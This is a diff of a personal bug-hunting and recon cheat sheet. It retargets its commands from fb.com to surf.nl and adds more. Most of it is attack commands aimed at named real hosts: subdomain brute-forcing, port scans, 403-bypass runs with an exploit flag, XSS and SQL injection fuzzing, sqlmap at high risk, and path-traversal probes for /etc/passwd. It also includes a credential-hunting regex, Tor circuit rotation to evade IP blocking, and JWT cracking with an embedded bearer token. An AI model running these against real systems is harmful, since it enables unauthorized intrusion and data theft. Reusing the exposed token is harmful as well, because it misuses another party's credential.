@@ -3,49 +3,64 @@
 SUBDOMAIN ENUMERATION
 
 
-echo fb.com  | ./fatima.sh
+echo surf.nl | ./fatima.sh
 
 ./frogy.sh
 
-pdlist fb.com  --strict -o /home/ibrahim/0output/list.txt
+pdlist surf.nl  --strict -o /home/ibrahim/0output/list.txt
 
-python3 /home/ibrahim/OneForAll/oneforall.py --target fb.com  run
+github-subdomains -d surf.nl -o /home/ibrahim/0output/github.txt
 
-/home/ibrahim/Downloads/github/SubDomz/./SubDomz -d fb.com  -o /home/ibrahim/0output/subdoamz.txt
+gitlab-subdomains -d surf.nl | tee -a /home/ibrahim/0output/gitlab.txt 
 
-/home/ibrahim/Downloads/github/sd-goo/./sd-goo.sh fb.com  | sort -u >> /home/ibrahim/0output/goo.txt
+python3 /home/ibrahim/OneForAll/oneforall.py --target surf.nl  run
 
-./Subdomain.sh fb.com  >> /home/ibrahim/0output/subdomain.txt
+/home/ibrahim/./sd-goo.sh surf.nl  | sort -u >> /home/ibrahim/0output/goo.txt
 
-shuffledns -d fb.com  -w country.txt -r resolvers.txt -o /home/ibrahim/0output/shuffllnsx.txt
+./Subdomain.sh surf.nl  >> /home/ibrahim/0output/subdomain.txt
 
-shuffledns -d fb.com  -w world.txt -r resolvers.txt -o /home/ibrahim/0output/shuffllnsxw.txt
 
-python3 ctfr/ctfr.py -d fb.com  -o /home/ibrahim/0output/ctfroutput.txt
+shuffledns -d surf.nl  -w country.txt -r resolvers.txt -o /home/ibrahim/0output/shuffllnsx.txt
 
-puredns bruteforce country.txt fb.com  -r resolvers.txt -w /home/ibrahim/0output/puredns.txt
+shuffledns -d surf.nl  -w world.txt -r resolvers.txt -o /home/ibrahim/0output/shuffllnsxw.txt
+
+python3 ctfr/ctfr.py -d surf.nl  -o /home/ibrahim/0output/ctfroutput.txt
+
+puredns bruteforce country.txt surf.nl  -r resolvers.txt -w /home/ibrahim/0output/puredns.txt
+
+wget "https://www.surf.nl"
+
+cat index.html | grep -i -o "[a-z0-9]*.surf.nl" | sort -u | tee -a /home/ibrahim/0output/index.txt
+
+cat sub_yahoo.txt| httpx -mc 200 > live.txt
 
 
 https://seckrd.com/subdomain-finder.php
 
-as3nt -t fb.com  -11 -o /home/ibrahim/0output/as3nt.txt
+as3nt -t surf.nl  -11 -o /home/ibrahim/0output/as3nt.txt
 
+amass enum -passive -norecursive -noalts -d surf.nl  -o /home/ibrahim/0output/amass.txt 
 
-knockpy fb.com  -w country.txt -o /home/ibrahim/0output/knockpy.txt
+amass enum -brute -active -d surf.nl  -o /home/ibrahim/0output/amass1.txt
 
-amass enum -passive -norecursive -noalts -d fb.com  -o /home/ibrahim/0output/amass.txt 
-
-amass enum -brute -active -d fb.com  -o /home/ibrahim/0output/amass1.txt
 
 SUBDOMAIN BRUTEFORCE
 
-dnsx -silent -d fb.com  -w country.txt -o /home/ibrahim/0output/dnsx.txt
+dnsx -silent -d surf.nl  -w country.txt -o /home/ibrahim/0output/dnsx.txt
 
-puredns resolve /home/ibrahim/aoutput/1.txt --write /home/ibrahim/aoutput/allsubfinal.txt
+puredns resolve /home/ibrahim/aoutput/allsubfinal.txt --write /home/ibrahim/aoutput/allsubfinalresolve.txt
 
-cat * | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u >> 2.txt
+cat /home/ibrahim/aoutput/allsubfinal.txt |  naabu -p 80,443
 
-ffuf -w country.txt -u https://FUZZ.fb.com
+cat /home/ibrahim/aoutput/allsubfinal.txt | naabu -silent | httpx -silent
+
+cat * | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep surf.nl | sort -u >> all.txt
+
+cat * | grep -i -o "[a-z0-9]*.surf.nl" | sort -u >> alls.txt
+
+amass enum -passive -norecursive -noalts -df alls.txt -o /home/ibrahim/0output/more-subdomains.txt
+
+ffuf -w country.txt -u https://FUZZ.surf.nl
 https://FUZZ.xx.com:8443
 https://FUZZ.xx.com:8080
 https://FUZZ.xx.com:8443
@@ -119,7 +134,7 @@ cat /home/ibrahim/0regulator/output.txt | puredns resolve >> /home/ibrahim/0regu
 
 MORE SUBDOMAIN
 
-python3 /home/ibrahim/0regulator/main.py fb.com  /home/ibrahim/0regulator/resolved.txt /home/ibrahim/0regulator/sub.rules
+python3 /home/ibrahim/0regulator/main.py surf.nl  /home/ibrahim/0regulator/resolved.txt /home/ibrahim/0regulator/sub.rules
 
 ./make_brute_list.sh sub.rules sub.brute
 
@@ -127,9 +142,13 @@ puredns resolve sub.brute --write sub.valid
 
 CONVERT SUBDOMAIN TO IP ADDRESS
 
-censys search fb.com  | grep 'ip' | egrep -v 'description' | cut -d ':' -f2 | tr -d \'\, | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u >> /home/ibrahim/Arecon/ip/sensysip.txt
+censys search surf.nl  | grep 'ip' | egrep -v 'description' | cut -d ':' -f2 | tr -d \'\, | grep -o '[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}\.[0-9]\{1,3\}' | sort -u >> /home/ibrahim/Arecon/ip/sensysip.txt
 
-shodan search Ssl.cert.subject.CN:"fb.com*" 200 --fields ip_str | httpx | tee ips.txt
+UNCOVER
+
+echo "ssl:'sonymusic.com' " | uncover -e fofa,censys,shodan,zoomeye| sort -u | httpx | tee -a /home/ibrahim/Arecon/ip/ips.txt
+
+shodan search Ssl.cert.subject.CN:"surf.nl*" 200 --fields ip_str | httpx | tee ips.txt
 
 
 echo jira | uncover -e shodan,censys,fofa,zoomeye
@@ -141,29 +160,36 @@ cat /home/ibrahim/aoutput/allsubfinal.txt | ./dnsplz.sh
 
 totalpass scan 192.168.1.1
 
-cat /home/ibrahim/Arecon/ip/sensysip.txt  | httpx | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/fatima-templates/termux-nuclei/
+cat /home/ibrahim/Arecon/ip/liveips.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/fatima-templates/termux-nuclei/
 
 totalpass scan -d your-wordlist 192.168.1.1
 ./iprecon.sh
 validipnocdn.txt
-for i in `cat /home/ibrahim/Arecon/ip/allip.txt`; do totalpass scan $i; done 
+for i in `cat /home/ibrahim/Arecon/ip/allipcdn.txt`; do totalpass scan $i; done 
 cat /home/ibrahim/Arecon/ip/subip.txt
-./isup.sh /home/ibrahim/Arecon/ip/1.txt
+./isup.sh /home/ibrahim/Arecon/ip/*.txt
 
 REMOVE CDN FROM IP
-cut-cdn -i /home/ibrahim/Arecon/ip/sensysip.txt | sort -u | tee -a /home/ibrahim/Arecon/ip/allip.txt
+cut-cdn -i /home/ibrahim/Arecon/ip/*.txt | sort -u | tee -a /home/ibrahim/Arecon/ip/allipcdn.txt
+
+for ip in $(cat /home/ibrahim/Arecon/ip/allip.txt);do echo $ip && ffuf -w /home/ibrahim/aoutput/allsubfinal.txt -u http://$ip -H "Host: FUZZ" -s -mc 200; done
+
 IP ADDRESS RECON
-./scan4all -l /home/ibrahim/Arecon/ip/allip.txt
+./scan4all -l /home/ibrahim/Arecon/ip/liveips.txt
 ./scan4all -tp http -list allOut.txt -v
 ./scan4all -l /home/ibrahim/Arecon/ip/allip.txt -v
 fuzz ip
 httpx -l /home/ibrahim/Arecon/ip/allip.txt -path 1.txt -sc -title -cl -fc 403,404,400
 
-cat /home/ibrahim/Arecon/ip/allip.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/fatima-templates/termux-nuclei/
+cat /home/ibrahim/Arecon/ip/*.txt | httpx | tee -a /home/ibrahim/Arecon/ip/liveips.txt
+
+cat /home/ibrahim/Arecon/ip/liveips.txt | nuclei -t /home/ibrahim/Desktop/Recon-villages/PENTEST-TIGER/fatima-templates/termux-nuclei/
 
 SCREENSHOT WEB
 
- cat /home/ibrahim/aoutput/allsublive.txt | aquatone -screenshot-timeout 30000
+cat /home/ibrahim/aoutput/allsublive.txt | aquatone -screenshot-timeout 30000
+ 
+cat /home/ibrahim/aoutput/allsublive.txt | sudo aquatone
 
 cat /home/ibrahim/aoutput/allsublive.txt | httpx -screenshot
 
@@ -174,7 +200,7 @@ naabu -list /home/ibrahim/aoutput/allsubfinal.txt -top-ports 1000 -exclude-ports
 naabu -list /home/ibrahim/aoutput/sub.txt -top-ports 1000 -exclude-ports 80,443 -o /home/ibrahim/Arecon/ip/ports.txt 
 
 
-naabu -list /home/ibrahim/Arecon/ip/allip.txt -p - -exclude-ports 80,443,21,22,25 -o /home/ibrahim/Arecon/ip/ports.txt 
+naabu -list /home/ibrahim/Arecon/ip/originip.txt -p - -exclude-ports 80,443 -o /home/ibrahim/Arecon/ip/ports.txt 
 
 3pScan -hf /home/ibrahim/Arecon/ip/allip.txt -Pn -top full
 
@@ -188,22 +214,40 @@ Bypass 403
 
 bash 403-bypass.sh -u http://62.27.117.108/.htpasswd --header
 
-bash 403-bypass.sh -u https://34.199.128.51 --exploit
+bash 403-bypass.sh -u https://order-form.easybell.de/assets/ --exploit
 
 /home/ibrahim/./bypass-40x.sh http://62.27.117.108/ /.htpasswd
 
 
 FUZZIN WEB
+ffuf -u https://target.com/FUZZ -c -ac -H 'user: agent'
 
-for i in `cat /home/ibrahim/aoutput/allsublive.txt`; do ffuf -u $i/FUZZ -w private.txt -mc 200 -se ;done
+XSS
+
+cat /home/ibrahim/aoutput/urlsnofuzz.txt | rapwp -p "<ibrahimhaxor>" | httpx -mr "<ibrahimhaxor>"
+
+SQLI
+
+cat /home/ibrahim/aoutput/urlsnofuzz.txt | rapwp -pL sqli.txt | httpx -sc -title -cl
+
+
+httpx -silent -l /home/ibrahim/aoutput/urlsnofuzz.txt -path lfi.txt -mr "root:x"   
+
+cat /home/ibrahim/aoutput/allsublive.txt | httpx -nc -silent -p 80,443,8080,8443,8088,9000,9001,9002,9003 -path "..0.000000..0.000000..0.000000..0.000000..0.000000..0.000000..0.000000etc0.000000passwd;/../;/../" -mr "root:x" 
+
+cat /home/ibrahim/aoutput/allsublive.txt | dirdar -err
+
+cat /home/ibrahim/aoutput/allsublive.txt | dirdar  -wl dirs-list.txt
+
+for i in `cat /home/ibrahim/aoutput/allsublive.txt`; do ffuf -u $i/FUZZ -w small.txt -mc 200 -se ;done
 
 httpx -l /home/ibrahim/aoutput/allsublive.txt -path open-redirect.txt -sc -title -cl -fr -mc 301,302
 
 ffuf -u http://FUZZ.s3.amazonaws.com -w /home/ibrahim/aoutput/allsubfinal.txt
 
-ffuf -w params.txt -X POST -d "FUZZ=5" -u "https://www.fb.com/googlemybusinesscode.php"
+ffuf -w params.txt -X POST -d "FUZZ=5" -u "https://www.surf.nl/googlemybusinesscode.php"
 
-ffuf -w params.txt -u "https://www.fb.com/googlemybusinesscode.php?FUZZ=5"
+ffuf -w params.txt -u "https://www.surf.nl/googlemybusinesscode.php?FUZZ=5"
 
 sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast
 
@@ -213,34 +257,43 @@ ffuf -w 1.txt -u https://xxx.com/FUZZ.txt -mc 200,302
 
 ffuf -w private.txt -u https://xxx.com/FUZZ.txt -mc 200,302
 
-httpx -l /home/ibrahim/aoutput/allsublive.txt -path 1.txt -sc -title -cl -fc 403,404,400,429,301
+httpx -l /home/ibrahim/aoutput/allsublive.txt -path 1.txt -fr -sc -title -cl -fc 403,404,400,429,301
 
 httpx -l /home/ibrahim/aoutput/allsublive.txt -path small.txt -sc -title -cl -mc 200
 
-echo https://www.fb.com  | httpx -path /home/ibrahim/aoutput/bug/wordlist/typo3.txt -sc -title -cl -fc 403,404,400 
+echo https://www.surf.nl  | httpx -path /home/ibrahim/aoutput/bug/wordlist/typo3.txt -sc -title -cl -fc 403,404,400 
 
 httpx -l /home/ibrahim/aoutput/jssubfuzz.txt -path /home/ibrahim/aoutput/js-endpoint.txt -sc -title -cl -fc 403,404,400
 
 cd Logsensor && python3 logsensor.py -f /home/ibrahim/aoutput/allsublive.txt --login 
 
-feroxbuster -u https://www.fb.com  -x pdf -x js,html -x php txt json,docx
+feroxbuster -u https://www.surf.nl  -x pdf -x js,html -x php txt json,docx
 
 fuzzuli -f /home/ibrahim/aoutput/allsublive.txt
 
 XSS EXPLOIT
 
-python3 /home/ibrahim/XSS/xss.py -u https://academy.fb.com/search?dir={xss} -p /home/ibrahim/XSS/payloads1.txt
+python3 /home/ibrahim/XSS/xss.py -u https://academy.surf.nl/search?dir={xss} -p /home/ibrahim/XSS/payloads1.txt
 
 for i in `cat /home/ibrahim/aoutput/nappy1.txt`; do python3 /home/ibrahim/XSS/xss.py -u $i{xss} -p /home/ibrahim/XSS/nappy.txt; done
 
 INFORMATION DISCLOSE
 
-dirsearch -l /home/ibrahim/aoutput/allsublive.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 — full-url
+dirsearch -u https://surf.nl/ -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 — full-url
 
 waybackrobots
 
 cat /home/ibrahim/aoutput/allsublive.txt | waybackrobots
 
+socialhunter -f /home/ibrahim/aoutput/allurls.txt
+
+PROTOTYPE POLLUSION
+
+cat /home/ibrahim/aoutput/urlsnofuzz.txt | ppmap
+
+HTTP REQUEST SMUGGLIN
+
+cat /home/ibrahim/aoutput/urlsnofuzz.txt | python3 smuggler/smuggler.py
 
 IP CONVERTER ssrf
 h.43z.one/ipconverter/
@@ -252,9 +305,21 @@ https://www.epochconverter.com/
 
 S3BUCKET RECON
 
-python3 ownbucket.py -t appypie --all
+python3 OwnBucket/ownbucket.py -t surf.nl --all
 
-S3CACHEPOISONING TEST
+S3CACHEPOISONING TEST BURPSUITE
+
+SQLI FUZZ
+
+python3 HBSQLI/hbsqli.py -l /home/ibrahim/aoutput/urlsnofuzz.txt -p HBSQLI/payloads.txt -H HBSQLI/headers.txt -v
+
+for i in `cat /home/ibrahim/aoutput/urlsnofuzz.txt`; do ffuf -mc 200 -u $i/FUZZ -w SQL-Injection.txt;done
+SQL-Injection.txt
+all-attacks-payloads.txt
+
+cat /home/ibrahim/aoutput/urlslive.txt | grep "=" | qsreplace -a "'" | ffuf -w - -u FUZZ -x http://127.0.0.1:8080
+
+cat /home/ibrahim/aoutput/js2000.txt | ffuf -w - -u FUZZ -x http://127.0.0.1:8080
 
 
 cat /home/ibrahim/aoutput/allsublive.txt | nuclei -t cache-poisoning-fuzz.yaml
@@ -286,6 +351,10 @@ URL ragex
 
 https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_\+.~#?&//=]*)
 
+apikey ragex
+
+(?i)((access_key|access_token|admin_pass|admin_user|algolia_admin_key|algolia_api_key|alias_pass|alicloud_access_key|amazon_secret_access_key|amazonaws|ansible_vault_password|aos_key|api_key|api_key_secret|api_key_sid|api_secret|api.googlemaps AIza|apidocs|apikey|apiSecret|app_debug|app_id|app_key|app_log_level|app_secret|appkey|appkeysecret|application_key|appsecret|appspot|auth_token|authorizationToken|authsecret|aws_access|aws_access_key_id|aws_bucket|aws_key|aws_secret|aws_secret_key|aws_token|AWSSecretKey|b2_app_key|bashrc password|bintray_apikey|bintray_gpg_password|bintray_key|bintraykey|bluemix_api_key|bluemix_pass|browserstack_access_key|bucket_password|bucketeer_aws_access_key_id|bucketeer_aws_secret_access_key|built_branch_deploy_key|bx_password|cache_driver|cache_s3_secret_key|cattle_access_key|cattle_secret_key|certificate_password|ci_deploy_password|client_secret|client_zpk_secret_key|clojars_password|cloud_api_key|cloud_watch_aws_access_key|cloudant_password|cloudflare_api_key|cloudflare_auth_key|cloudinary_api_secret|cloudinary_name|codecov_token|config|conn.login|connectionstring|consumer_key|consumer_secret|credentials|cypress_record_key|database_password|database_schema_test|datadog_api_key|datadog_app_key|db_password|db_server|db_username|dbpasswd|dbpassword|dbuser|deploy_password|digitalocean_ssh_key_body|digitalocean_ssh_key_ids|docker_hub_password|docker_key|docker_pass|docker_passwd|docker_password|dockerhub_password|dockerhubpassword|dot-files|dotfiles|droplet_travis_password|dynamoaccesskeyid|dynamosecretaccesskey|elastica_host|elastica_port|elasticsearch_password|encryption_key|encryption_password|env.heroku_api_key|env.sonatype_password|eureka.awssecretkey)[a-z0-9_ .\-,]{0,25})(=|>|:=|\|\|:|<=|=>|:).{0,5}['\"]([0-9a-zA-Z\-_=]{8,64})['\"]
+
 
 
 
@@ -294,35 +363,35 @@ https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0
 
 GOOGLE DORKS
 
-site:fb.com
+site:surf.nl
  Dorks I always use
 
-site:*.fb.com ext:asp
+site:*.surf.nl ext:asp
 
-site:*.fb.com ext:jsp
+site:*.surf.nl ext:jsp
 
-site:*.fb.com ext:aspx
+site:*.surf.nl ext:aspx
 
-site:*.fb.com ext:jspx
+site:*.surf.nl ext:jspx
 
-site:*.fb.com ext:do
+site:*.surf.nl ext:do
 
-site:*.fb.com ext:action
+site:*.surf.nl ext:action
 
-site:*.fb.com ext:php
+site:*.surf.nl ext:php
 
 
 Shodan Searching 
-ssl:"X" 200 Ssl.cert.subject.CN:"fb.com" 200
-ssl.cert.subject.CN:"*.fb.com" http.title:"index of/"
+ssl:"X" 200 Ssl.cert.subject.CN:"surf.nl" 200
+ssl.cert.subject.CN:"*.surf.nl" http.title:"index of/"
 
-ssl.cert.subject.CN:"*.fb.com" http.title:"gitlab"
+ssl.cert.subject.CN:"*.surf.nl" http.title:"gitlab"
 
-ssl.cert.subject.CN:"*.fb.com" http.title:"gitlab"
+ssl.cert.subject.CN:"*.surf.nl" http.title:"gitlab"
 
-ssl.cert.subject.CN:"*.fb.com" "230 login successful" port:"21"
+ssl.cert.subject.CN:"*.surf.nl" "230 login successful" port:"21"
 
-ssl.cert.subject.CN:"*.fb.com"+200 http.title:"Admin" 
+ssl.cert.subject.CN:"*.surf.nl"+200 http.title:"Admin" 
 
 EXTERNAL RECON
 
@@ -330,7 +399,7 @@ https://inteltechniques.com/tools/Domain.html
 
 Extract domain from text and urls recon
 https://ultimatedomains.com/extract-domains.php
-otx.alienvault.com/indicator/domain/fb.com
+otx.alienvault.com/indicator/domain/surf.nl
 https://web-check.as93.net/
 https://intelx.io/
 https://app.netlas.io/host
@@ -359,9 +428,33 @@ https://adfshelp.microsoft.com/JwtDecoder/GetToken
 https://publicwww.com/
 https://viewdns.info/reversewhois
 
+GET DOMAIN BY IP
+ 
+https://www.infobyip.com/ip-138.201.19.185.html
+
+BYPASS IP
+
+sudo tmux new -s tor
+while true; do pkill -HUP tor; sleep 1; done
+
+curl --socks5-hostname localhost:9050 https://api.ipify.org/
+
+
+ffuf -w 1.txt -u https://res.rbl.ms/FUZZ -x socks5://127.0.0.1:9050 -t 5 -rate 50 -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/113.0"
+
+nuclei -u https://hackerone.com -p socks5://127.0.0.1:9050
+
+
+
 apkleak
 
 apkleaks -f /home/ibrahim/Desktop/APK/easybell.apk -p rules.json -o ~/home/ibrahim/Desktop/APK/apkleaks-results.txt
+
+cat jwtsecret.txt | ./gojwtcrack -t configure8.txt
+
+ python3 jwt_tool.py -t https://app.configure8.io/people/users -rh 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJiMzU2OGJiYi0xYTViLTQ2YWMtYjllNi04ODc0MzQwMzU0M2UiLCJ0eXBlIjoiQUNDRVNTX1RPS0VOIiwiaWF0IjoxNjk1MDM5Mzc5LCJleHAiOjE2OTUxMjU3Nzl9.BdH3Oz-ufCFwUx80WOLWRrugmsSlhWGFCgXnUX8lXl8' -M at
+
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiJiMzU2OGJiYi0xYTViLTQ2YWMtYjllNi04ODc0MzQwMzU0M2UiLCJ0eXBlIjoiQUNDRVNTX1RPS0VOIiwiaWF0IjoxNjk1MDM5Mzc5LCJleHAiOjE2OTUxMjU3Nzl9.BdH3Oz-ufCFwUx80WOLWRrugmsSlhWGFCgXnUX8lXl8
 
 
 
